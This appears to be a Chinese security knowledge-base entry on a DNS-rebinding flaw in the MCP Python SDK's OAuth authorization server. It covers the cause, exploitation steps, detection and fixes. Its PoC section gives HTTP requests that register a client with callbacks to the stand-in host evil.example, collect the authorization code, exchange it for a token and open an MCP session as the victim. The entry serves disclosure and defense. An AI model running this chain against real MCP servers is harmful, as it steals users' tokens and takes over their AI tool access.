---
id: ai-security-mcp-security-oauth-authz-server-missing-host-check-rebinding
title: MCP SDK 授权服务器缺 Host/Origin 校验：DNS rebinding 注册客户端并窃取令牌接管 MCP
type: scenario
domain: ai-security
path: ai-security/mcp-security
technique: mcp-oauth-authz-server-missing-host-check-dns-rebinding
tags:
- mcp
- oauth
- dns-rebinding
- host-header
- authorization-server
- token-theft
- redirect-uri
- python-sdk
- loopback
cve: []
severity: high
confidence: high
status: verified
affected_versions: mcp Python SDK 1.x–2.3.0（原文核查 v1.28.1 / v2.0.0 / v2.3.0 授权服务器均无 Host 校验；未给出修复版本）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T04:12:09+08:00'
  notes: 已对照原文全文与5张内嵌图核对：transport_security.py 的 TransportSecurityMiddleware 只在 streamable_http/sse 使用，auth/routes.py 仅 import RequestBodyLimitMiddleware；七个授权端点伪造Host均非421（/register 201、/authorize 400、/token 401等）；完整链路注册→授权→登录回调302带code→换token→introspect active→/mcp initialize 200；伪造Host打/mcp 421、无token 401；2.0.0/2.3.0 仅2.3.0对5MB返回413；FastMCP有HostOriginGuardMiddleware不受影响。affected_versions 按原文核查的 1.28.1/2.0.0/2.3.0 与'1.x到2.x出现次数为0'保留，原文未给修复版本。未复现PoC。
url: /docs/ai-security/mcp-security/ai-security-mcp-security-oauth-authz-server-missing-host-check-rebinding/
draft: false
kb_aliases:
- MCP SDK Host 校验缺失
- create_auth_routes 未校验 Host
- MCP OAuth DNS rebinding
- 授权服务器 DNS rebinding
- MCP 令牌窃取
- OAuth 任意 redirect_uri 注册
---

## 一句话结论

MCP 官方 Python SDK 的 `create_auth_routes()` 返回的 OAuth 授权服务器路由只挂了 CORS 与请求体大小限制，没有挂传输侧那套 Host/Origin 校验；当授权服务器与 MCP 资源服务器按官方示例跑在本机回环端口时，攻击者网页可借 DNS rebinding 变成同源，调用 `/register` 注册一个回调指向自己的客户端，再驱动 `/authorize` 把授权码发到攻击者地址、用 `/token` 换成访问令牌，最终以受害者身份连接 `/mcp`。

## 原理

- **两套防护只做了一套**：`src/mcp/server/transport_security.py` 里同时有 `TransportSecurityMiddleware`（Host/Origin 白名单，不通过返回 421 Misdirected Request）和 `RequestBodyLimitMiddleware`。`streamable_http.py`/`sse.py` 在回环地址绑定时会自动启用前者；而 `src/mcp/server/auth/routes.py` 只 import 了后者，并把 `_cors`、`_body_limited` 装饰到 authorize/token/register 等路由上，没有 Host/Origin 校验。整个 `server/auth/` 目录搜索 host/origin/referer 只命中 issuer URL 格式校验和 `allow_origins="*"`。
- **DNS rebinding 为什么能绕过浏览器边界**：公网页面直接 `fetch` 本机 9000 端口会被 Private Network Access 预检拦住（授权服务器响应缺少 `Access-Control-Allow-Private-Network`）。但 DNS rebinding 让攻击者域名先解析到攻击者 IP、再重新解析到 `127.0.0.1`，浏览器认为请求仍是同源，不触发 CORS/PNA 预检；于是攻击者页面可以读写本机授权服务器的响应。
- **动态客户端注册（RFC 7591）是常态**：`/register` 返回 201 并签发 `client_id`/`client_secret`，且原示例不限制 `redirect_uris`。攻击者把回调写成自己的域名，后续授权码就会按 OAuth 规范发到攻击者。
- **授权码与令牌**：`/authorize` 把请求转到登录页/IdP；若受害者浏览器在企业 IdP 有活跃会话，流程自动完成；若使用本地表单 provider，rebinding 后攻击者页面可以同源渲染登录页并钓鱼。授权成功后 302 的 `Location` 指向攻击者回调并携带 `code`；攻击者用 `code + code_verifier + client_secret` 调 `/token` 换 `access_token`，`/introspect` 显示令牌的 `sub` 为受害者、`aud` 为 MCP 资源服务器。
- **为什么令牌能直接打 MCP**：资源服务器要求有效 Bearer Token，且认证中间件在 Host 校验之前（无令牌先 401）；攻击者拿的是合法授权服务器签发的令牌，`aud` 匹配，因此可以正常 POST `/mcp` 完成 `initialize` 并调用工具。带伪造 Host 打 `/mcp` 会 421，但攻击者此时用正常 Host 即可。
- **版本与范围**：原文核查 v1.28.1、v2.0.0、v2.3.0 的授权服务器均无 Host 校验；2.3.0 只补了 5MB 请求体限制（`#3336`，同一文件另一个类），Host 校验未补。受影响的写法是直接用 `create_auth_routes()` 组装 ASGI 应用（官方 `examples/servers/simple-auth` 即如此）；FastMCP 自带 `HostOriginGuardMiddleware`，不受影响；授权服务器独立进程且前置反向代理拦 Host 的也不受影响。

## 触发条件

- 部署直接用 `mcp` Python SDK 的 `create_auth_routes()` 组装授权服务器，且与 MCP 资源服务器在同一进程/端口空间（常见于本机回环部署）。
- 授权服务器监听 `127.0.0.1`/`localhost` 等回环地址，受害者浏览器可访问该端口。
- 动态客户端注册开启（MCP 客户端发现流程的常态），或攻击者已掌握一个可用 `client_id`。
- `redirect_uris` 未做严格白名单（原示例允许任意地址）。
- 登录 provider 可被受害者已有会话自动完成，或本地表单可通过 rebinding 同源钓鱼。
- 授权服务器前没有反向代理/网关强制校验 Host。

## 利用步骤

1. 攻击者页面使用 DNS rebinding 域名（先解析到攻击者服务器，短 TTL 后解析到 `127.0.0.1`），让浏览器把后续请求视为同源发往本机授权服务器。
2. `POST /register`，`redirect_uris` 填 `http://<攻击者域名>/cb`，拿到 `client_id`/`client_secret`（201）。
3. `GET /authorize?client_id=...&redirect_uri=http://<攻击者域名>/cb&code_challenge=...&resource=http://localhost:8001/mcp`，驱动登录/IdP 流程。
4. 受害者完成登录（IdP 活跃会话或钓鱼表单）后，授权服务器 302 到 `http://<攻击者域名>/cb?code=...&state=...`，攻击者服务器记录授权码。
5. `POST /token`，提交 `grant_type=authorization_code`、`code`、`code_verifier`、`client_id`/`client_secret`，得到 `access_token`（200）。
6. 用 `Authorization: Bearer <token>`、正常 Host 向 `http://localhost:8001/mcp` 发 `initialize`，建立 MCP 会话并调用工具。
7. 可选：`POST /introspect` 确认 `active:true`、`sub` 为受害者、`aud` 指向 MCP。

## PoC

```http
# [1] 注册客户端（Host 为攻击者 rebinding 域名，服务端不校验）
POST /register HTTP/1.1
Host: evil.example
Origin: https://evil.example
Content-Type: application/json

{"client_name":"probe","redirect_uris":["http://evil.example/cb"],
 "grant_types":["authorization_code"],"token_endpoint_auth_method":"client_secret_post"}

# 201 -> client_id / client_secret

# [2] 发起授权
GET /authorize?response_type=code&client_id=<client_id>&redirect_uri=http://evil.example/cb
    &code_challenge=<S256>&code_challenge_method=S256&resource=http://localhost:8001/mcp HTTP/1.1
Host: evil.example

# 302 -> /login?state=...（或 IdP 登录）

# [3] 登录回调后
# 302 Location: http://evil.example/cb?code=mcp_xxx&state=...

# [4] 换令牌
POST /token HTTP/1.1
Host: evil.example
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=mcp_xxx&redirect_uri=http://evil.example/cb
&client_id=<client_id>&client_secret=<client_secret>&code_verifier=<verifier>

# 200 -> access_token=mcp_yyy, expires_in=3600

# [5] 打 MCP（正常 Host）
POST /mcp HTTP/1.1
Host: localhost:8001
Authorization: Bearer mcp_yyy
Content-Type: application/json
Accept: application/json, text/event-stream

{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}
```

```text
# 对照：
# 同一伪造 Host 打 /mcp -> 421 Invalid Host header（传输侧校验生效）
# 同一伪造 Host 打授权服务器 7 个端点 -> 200/201/400/401/404，均非 421（授权侧未校验）
# 无令牌打 /mcp -> 401（认证在 Host 校验之前）
```

## 变体与关联

- 变体：授权服务器使用企业 IdP 时，受害者已有会话会让授权自动完成，攻击者只需在回调处收码。
- 变体：关闭动态注册时，攻击者需先取得一个 `client_id`，仍可驱动授权流程。
- 变体：其他语言/SDK 的 MCP 授权服务器若同样只挂 CORS/请求体限制而未复用传输安全中间件，具有相同缺口。
- 变体：`redirect_uris` 任意可填本身也是独立的 OAuth 缺陷；即使补了 Host 校验，不收紧回调白名单仍会把令牌发给攻击者。
- 关联：[[ai-security-mcp-security-inspector-cors-stdio-rce]]（MCP 组件另一类浏览器边界问题）、[[web-generic-oauth]]（OAuth redirect_uri 与授权码窃取）、[[web-generic-ssrf]]（DNS rebinding 的同源绕过基础）。
- 边界：FastMCP 自带 HostOriginGuardMiddleware；授权服务器独立进程+反向代理严格校验 Host；关闭注册且无已知 client_id；浏览器/PNA 策略或网络隔离阻断回环访问时失效。

## 检测与防御

- 检测：授权服务器端点收到伪造/非白名单 Host 仍返回非 421；`/register` 出现指向外部域名的 `redirect_uris`；同源页面短时间内完成注册→授权→换令牌；`/token` 后立即出现新 `client_id` 对 `/mcp` 的 `initialize`；DNS 解析在同一域名上快速翻转（rebinding 特征）。
- 修复（上游）：在 `create_auth_routes()` 返回的路由最外层加独立的 Host/Origin 校验，不通过返回 421；不要直接复用 `TransportSecurityMiddleware.validate_request`，因为它把 Host/Origin 校验与“POST 必须是 application/json”绑在一起，会打断 OAuth 表单流程（`application/x-www-form-urlencoded`）。
- 修复（部署）：授权服务器前挂反向代理，Host 不在白名单直接 `return 444`；把授权服务器与 MCP 资源服务器拆分到不同进程/端口空间；使用企业 IdP 并收紧 `redirect_uris` 到自家域名；生产环境关闭不需要的动态注册。
- 加固：CORS 不要 `allow_origins="*"`；补充 `Access-Control-Allow-Private-Network` 的拒绝策略不能替代 Host 校验；对回环端口做来源校验与访问审计。
